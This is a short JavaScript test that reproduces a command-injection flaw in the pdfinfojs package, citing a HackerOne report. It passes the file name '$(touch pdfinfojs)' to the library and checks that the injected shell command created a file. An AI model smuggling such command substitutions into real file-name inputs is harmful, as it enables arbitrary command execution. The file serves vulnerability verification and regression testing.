//https://hackerone.com/reports/330957
test("Command Injection in pdfinfojs", () => 
{
	const pdfinfo = require('pdfinfojs');
	const fs = require('fs');
	const path = './pdfinfojs';
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
	pdf = new pdfinfo('$(touch pdfinfojs)');
	pdf.getInfo(function(err, info, params) {});

	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});
